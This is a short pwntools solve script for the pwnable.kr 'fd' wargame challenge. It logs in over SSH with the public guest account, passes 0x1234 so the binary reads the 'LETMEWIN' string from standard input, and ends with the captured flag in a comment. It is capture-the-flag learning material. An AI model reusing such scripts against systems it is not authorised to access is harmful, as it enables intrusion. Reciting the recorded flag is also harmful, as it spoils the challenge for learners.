#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './fd')

### defines ###
CMD_ARGV = [str(0x1234)] # The binary sub from argv[1] 0x1234 then read from it, so it will read from '/bin/stdin' - user input.
LETMEWIN = "LETMEWIN" # Used to pass the input check.

### SSH Config ###

host = args.HOST or 'pwnable.kr'
port = int(args.PORT or 2222)
user = args.USER or 'fd'
password = args.PASSWORD or 'guest'

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    ssh_client = ssh(user, host, port=port, password=password, timeout=10)
    io = ssh_client.process(['./fd'] + argv, tty=True)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
def main():
    io = start(CMD_ARGV)
    io.sendline(LETMEWIN)
    io.interactive()

if __name__ == "__main__":
    main()

#flag: Mama! Now_I_understand_what_file_descriptors_are!
